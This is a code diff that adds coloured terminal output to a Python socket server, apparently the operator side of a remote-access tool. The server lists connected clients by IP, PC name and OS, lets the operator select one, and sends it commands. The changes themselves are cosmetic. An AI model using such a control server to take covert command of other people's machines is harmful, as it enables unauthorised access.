@@ -16,6 +16,9 @@ from socket import socket, SOL_SOCKET, SO_REUSEADDR, error as SocketError
 from time import sleep
 from threading import Thread
 
+from miscs import *
+from miscs.colors import fColors
+
 """ Section 1: Develop Utitlity Objects(Global Variables, lambda's, functions) """
 
 # Step 2: Define Global Variables
@@ -74,19 +77,19 @@ def create_socket():
         objSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 
     except SocketError as e:
-        print(f'[-] Error while Creating Socket. \n[-] Error: {e}')
+        print(f'{fColors.LIGHT_RED}[-] Error while Creating Socket. \n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
 
 
 # Step 6: Define a Function to Bind Socket
 def socket_bind():
     global objSocket  # noqa
     try:
-        print(f"[+] Listening on Port: {str(SERVER_PORT)}")
+        print(fColors.LIGHT_GREEN + f"[+] Listening on Port: {str(SERVER_PORT)}" + fColors.RESET)
         objSocket.bind((SERVER_HOST, SERVER_PORT))  # noqa
         objSocket.listen(20)
 
     except SocketError as e:
-        print(f'[-] Error while Binding Socket. \n[-] Error: {e}')
+        print(f'{fColors.LIGHT_RED}[-] Error while Binding Socket. \n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
         socket_bind()
 
 
@@ -110,16 +113,18 @@ def socket_accept():
             arrAddresses.append(address)
 
             # address[0] is IP Address, address[2] is Client PC Information
-            print(f"\n[+] Connection has been Established Succesfully: {address[0]} ({address[2]})")
+            print(fColors.LIGHT_GREEN +
+                  f"\n[+] Connection has been Established Succesfully: {address[0]} ({address[2]})" + fColors.RESET)
 
         except SocketError as e:
-            print(f'[-] Error while Accepting Connection. \n[-] Error: {e}')
+            print(f'{fColors.LIGHT_RED}[-] Error while Accepting Connection. '
+                  f'\n[-] Error: {fColors.WHITE}{e}{fColors.RESET}')
             continue
 
 
 # Step 12: Define a Function to Show Help Menu
 def menu_help():
-    print("""\n
+    print(fColors.LIGHT_BLUE+"""\n
     Main Menu Options:
     ---------
     --l, list: Connect to Server
@@ -128,11 +133,11 @@ def menu_help():
     --help, help: Show Help Menu
     --x, exit: Disconnect from Server
     
-    """)
+    """ + fColors.RESET)
 
 # this function used to show All Commands list
 def commands_help():
-    print("""\n
+    print(fColors.LIGHT_BLUE+"""\n
     Commands List Help Menu:
     ---------
     --m [MESSAGE]: Send Message to the Client
@@ -141,7 +146,7 @@ def commands_help():
     --help, help: Show Help Menu
     --x, exit: Disconnect from Server
     
-    """)
+    """ + fColors.RESET)
 
 
 # Step 13: Define a Function for Main Menu
@@ -150,7 +155,7 @@ def commands_help():
 def main_menu():
     while True:
         # Get Command from User input
-        strChoice = input("\n[Main Menu]$>> ")
+        strChoice = input(fColors.LIGHT_YELLOW + "\n[Main Menu]$>> " + fColors.RESET)
 
         # --l or list: Command to List Available Connections
         if strChoice == '--l' or strChoice == 'list':
@@ -177,7 +182,7 @@ def main_menu():
 
         # Invalid Choice
         else:
-            print("[-] Invalid Choice, Please Try Again")
+            print(fColors.LIGHT_RED + "[-] Invalid Choice, Please Try Again" + fColors.RESET)
             menu_help()
             main_menu()     # or continue
 
@@ -209,12 +214,12 @@ def list_connections():
                 str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                 str(arrAddresses[intCounter][3]) + "\n"
 
-        print("\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " + \
-              center(str(arrAddresses[0][1]), "PORT") + 4*" " + \
-              center(str(arrAddresses[0][2]), "PC Name") + 4*" " + \
-              center(str(arrAddresses[0][3]), "OS Name") + "\n" + strClients, end="")
+        print(fColors.GREEN + "\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " + \
+              center(str(arrAddresses[0][1]), "PORT") + 4*" " + fColors.CYAN +\
+              center(str(arrAddresses[0][2]), "PC Name") + 4*" " + fColors.CYAN +\
+              center(str(arrAddresses[0][3]), "OS Name") + "\n" + fColors.LIGHT_GREEN +strClients  + fColors.RESET, end="")
     else:
-        print("[-] No Connections Found!!.")
+        print(fColors.LIGHT_RED + "[-] No Connections Found!!." + fColors.RESET)
 
 # Step 17: Define `select_connection()` Function to Select a Connection
 def select_connection(connection_id, get_response):
@@ -224,7 +229,7 @@ def select_connection(connection_id, get_response):
         selectedID = connection_id
         conn = arrConnections[connection_id]
 
-    except: print("[-] Invalid Choice! Please Try Again."); return # noqa
+    except: print(fColors.LIGHT_RED+"[-] Invalid Choice! Please Try Again."  + fColors.RESET); return # noqa
 
     # if any error not happens, fill arrInfo by User Information
     else:
@@ -239,7 +244,7 @@ def select_connection(connection_id, get_response):
 
         # Check if the get_response is True show Connected message to the user
         if get_response == 'True':
-            print(f"[+] You Are Connect to {arrInfo[0]}  ......\n")
+            print(fColors.LIGHT_GREEN + f"[+] You Are Connect to {arrInfo[0]}  ......\n" + fColors.RESET)
 
         return conn
 
@@ -249,7 +254,7 @@ def select_connection(connection_id, get_response):
 def send_commands():
     while True:
         prompt = f"({arrInfo[0]}){arrInfo[3]}@{arrInfo[1]}"
-        strChoice = input(f"{prompt}$>> ")
+        strChoice = input(f"{fColors.LIGHT_YELLOW}{prompt}$>> {fColors.RESET}")
 
         #--m [MESSAGE]: Command for Send Message to Client
         if strChoice[:3] == '--m' and len(strChoice) > 3:
